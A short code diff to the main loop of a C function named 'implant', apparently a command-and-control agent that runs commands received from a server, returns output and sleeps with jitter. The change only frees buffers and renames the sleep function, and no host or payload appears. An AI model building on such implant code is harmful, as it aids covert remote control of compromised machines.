@@ -41,6 +41,11 @@ void implant() {
                     Dprintf("[d] server failed to accepted our response data");
                 }
 
+                free(client->command);
+                free(output);
+                free(response_bytes);
+                free(req);
+
                 client->status = Idle;
                 break;
 
@@ -55,7 +60,7 @@ void implant() {
         }
 
         Dprintf("[d] client status is: %d\n", client->status);
-        jittered_sleep();
+        jitter_sleep();
     }
 }
 
